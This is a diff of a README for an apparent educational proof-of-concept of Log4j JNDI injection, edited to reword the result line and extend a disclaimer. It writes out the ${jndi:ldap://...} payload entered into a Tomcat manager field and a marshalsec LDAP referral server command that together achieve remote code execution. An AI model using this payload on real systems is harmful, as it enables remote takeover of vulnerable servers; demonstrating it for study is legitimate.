@@ -26,11 +26,11 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http:/
 ### Attack
 Input ${jndi:ldap://127.0.0.1:1389/Exploit} in the field 'XML Configuration file path' inside http://localhost:8080/manager/html manager app
 
-Exploit class is loaded and RCE done (Calculator app will be loaded)
+Exploit class is loaded and RCE loaded (Calculator app will be opened)
 
 ## Disclaimer
 
-The repo is just a POC done for educational purpose.
+The repo is just a POC done for educational purpose. The repo owner is not responsible for any damages done. As a moral note, Don't be evil.
 
 ## References
 LDAP exploit https://github.com/mbechler/marshalsec
